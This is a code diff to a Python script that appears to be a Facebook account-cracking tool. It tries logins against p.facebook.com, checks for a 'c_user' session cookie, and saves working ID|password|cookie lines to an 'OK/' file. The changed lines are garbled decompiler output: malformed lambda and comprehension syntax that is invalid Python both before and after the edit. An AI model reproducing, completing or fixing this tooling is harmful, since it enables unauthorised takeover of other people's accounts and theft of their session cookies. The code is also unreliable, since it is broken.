@@ -1369,7 +1369,7 @@ for xd in range(10000):
                 if 'c_user' in ses.cookies.get_dict().keys():
                     ok += 1
                     coki = po.cookies.get_dict()
-                    koki = (lambda 0: for key, value in 0:
+                    koki = (lambda : for key, value in 0:
 [ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
                     print(f'''\r{P}{H} [DEVI-OK] {H}{idf}|{pw}\n{P}[{H}Cookei]{P}\x1b[1;34m{kuki}''')
                     open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
@@ -1423,7 +1423,7 @@ for xd in range(10000):
                     'next': 'https://p.facebook.com/login/save-device/',
                     'flow': 'login_no_pin',
                     'pass': pw }
-                koki = (lambda 0: for key, value in 0:
+                koki = (lambda : for key, value in 0:
 [ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
                 koki += ' m_pixel_ratio=2.625; wd=412x756'
                 heade = 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
@@ -1462,7 +1462,7 @@ for xd in range(10000):
             for i in range(len(game)):
                 print(f'''\r{P!s}  \x1b[0m {H!s}{game[i].replace('Added on', ' Added on')!s}''')
                 if AttributeError:
-                    (lambda 0: for i in 0:
+                    (lambda : for i in 0:
                     
 [ i.text ])
                     print('\r    %s\x1b[0m cookie invalid' % M)
@@ -1475,7 +1475,7 @@ for xd in range(10000):
                 print(f'''\r{P!s}  \x1b[0m {game[i].replace('Expired', ' Expired')!s}''')
                 return None
                 if AttributeError:
-                    (lambda 0: for i in 0:
+                    (lambda : for i in 0:
 [ i.text ])
                     print('\r    %s \x1b[0mcookie invalid' % M)
                     return None
@@ -1488,6 +1488,7 @@ for xd in range(10000):
             Mano_menu()
             return None
         return None
+
 
 
 
